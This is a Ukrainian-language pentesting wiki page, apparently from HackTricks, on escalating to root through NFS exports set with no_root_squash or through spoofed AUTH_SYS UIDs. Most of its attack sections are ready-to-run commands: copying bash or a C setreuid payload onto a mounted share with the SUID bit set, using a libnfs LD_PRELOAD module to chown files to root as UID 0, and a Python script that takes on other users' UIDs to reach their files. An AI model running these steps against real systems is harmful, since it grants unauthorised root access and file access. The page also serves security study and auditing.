# Ескалація привілеїв через неправильне налаштування NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Основна інформація про squashing

За використання NFS AUTH_SYS/AUTH_UNIX сервер перевіряє дозволи на файли на основі `uid` і `gid`, указаних у кожному RPC-запиті. Інші security flavors, як-от Kerberos, використовують інші облікові дані, а сервер може зіставляти числові облікові дані перед перевіркою дозволів.<sup>[[4]](#references)[[5]](#references)</sup>

- **`all_squash`**: Зіставляє всі UID і GID з анонімним обліковим записом, який у Linux за замовчуванням має назву `nobody` (65534). Для запитів не від root за замовчуванням використовується `no_all_squash`.<sup>[[4]](#references)</sup>
- **`root_squash`**: Це значення за замовчуванням у Linux. Воно зіставляє запити з UID/GID 0 (root) з анонімним обліковим записом; інші UID і GID не піддаються squashing.<sup>[[4]](#references)</sup>
- **`no_root_squash`**: Вимикає root squashing, тож запити з UID/GID 0 можуть оброблятися на сервері як запити від root.<sup>[[4]](#references)</sup>

Якщо дозволений клієнт може підключити доступний для запису export, налаштований у **`/etc/exports`** з параметром **`no_root_squash`**, його запити з UID/GID 0 зможуть записувати туди від імені root на сервері.<sup>[[4]](#references)</sup>

`root_squash` лише зіставляє UID/GID 0 з іншими значеннями; за AUTH_SYS **ненульові числові UID/GID** дозволеного клієнта все ще можуть збігатися з іншим обліковим записом на сервері. Тому доступний для запису export може стати шляхом до іншого облікового запису навіть за ввімкненого root squashing, якщо клієнт може створити файл із таким числовим ідентифікатором і сервер дозволяє доступ. Для передачі через SUID/SGID також перевірте власника створеного файла, доступ для виконання, стан `nosuid` у монтуванні на сервері, ACL і SELinux або інші політики. Самі лише шлях експорту, параметр `rw` чи збіг чисел не доводять, що клієнту дозволено доступ, export активний або обидва хости використовують однакове зіставлення ідентифікаторів. Пасивно перевірте `/etc/exports` і локальні метадані; під час перерахування не монтуйте новий ресурс і не створюйте тестовий файл.<sup>[[4]](#references)[[5]](#references)</sup>

Детальніше про **NFS** читайте:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Ескалація привілеїв

### Віддалений експлойт

Варіант 1 із використанням bash:
- На дозволеному клієнті під root підключіть доступний для запису export, скопіюйте до нього **`/bin/bash`**, установіть його біт **SUID** і запустіть його з монтування жертви, де не використовується `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
    - Щоб завантажений файл залишився власністю root, на сервері має бути ввімкнено **`no_root_squash`**. Якщо root піддається squashing, створити SUID-бінарний файл для іншого облікового запису можна лише тоді, коли клієнт може легітимно створити його або стати його власником, використовуючи числовий UID/GID цього облікового запису.<sup>[[4]](#references)</sup>

```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

Option 2 using compiled C code:
- Змонтуйте директорію з дозволеного клієнта, скопіюйте туди скомпільований payload, який використовує дозволи SUID, установіть його біт **SUID** і виконайте на цільовій системі (див. [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
    - Ті самі обмеження, що й раніше

```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Local Exploit

> [!TIP]
> Зверніть увагу: якщо ви можете створити **тунель зі своєї машини до машини-жертви, ви все одно можете скористатися Remote-версією для Exploit цієї ескалації привілеїв, прокинувши потрібні порти**.\
> Наведений нижче прийом корисний, якщо `/etc/exports` обмежує доступ до експорту IP-адресою жертви: віддалений клієнт не може його змонтувати, але локальний метод може працювати через спільний ресурс, уже змонтований на дозволеному хості.<sup>[[2]](#references)</sup>\
> Для цього методу libnfs без привілеїв в експорті в **`/etc/exports`** має бути встановлено прапорець `insecure`, щоб процес міг використовувати незарезервований вихідний порт; за замовчуванням використовується `secure`, хоча процесу, здатному прив’язатися до зарезервованого порту, ця опція не потрібна.<sup>[[1]](#references)[[4]](#references)</sup>

### Основна інформація

Клієнт NFSv3 AUTH_UNIX передає свій ефективний UID, GID і групи в кожному виклику, а сервер використовує їх для перевірки дозволів. Цей локальний метод зловживає такою моделлю, підробляючи облікові дані RPC за допомогою [libnfs](https://github.com/sahlberg/libnfs); його preload-модуль підтримує перевизначення UID/GID у контексті NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>

#### Компіляція бібліотеки

Приклад libnfs може потребувати змін для цільового ядра; у наведеному тут посібнику зазначено, що перед компіляцією preload-модуля потрібно закоментувати системні виклики fallocate.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

#### Виконання Exploit

У прикладі створюється невелика допоміжна програма на C, яка запускає shell. Потім її розміщують у спільному каталозі та використовують `ld_nfs.so` з UID 0 у контексті NFS, щоб надати їй права SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>

1. **Скомпілюйте код exploit:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Розмістіть exploit на спільному ресурсі та змініть його дозволи, підробивши UID**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Виконайте exploit, щоб отримати права root**.<sup>[[2]](#references)</sup>

```bash
/mnt/share/a.out
#root
```

### Бонус: NFShell для прихованого доступу до файлів

Після отримання root-доступу цей шаблон `nfsh.py` встановлює ефективний UID як UID цільового файлу перед виконанням команди, надаючи доступ без рекурсивної зміни власника.<sup>[[2]](#references)</sup>

```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```

Запустіть так:

```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```

## References

- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
- [2] [Історія про менш відомий NFS privesc](https://www.errno.fr/nfs_privesc.html)
- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
- [4] [exports(5) — сторінка посібника Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
- [5] [RFC 1813: специфікація протоколу NFS версії 3](https://datatracker.ietf.org/doc/html/rfc1813)
{{#include ../../banners/hacktricks-training.md}}
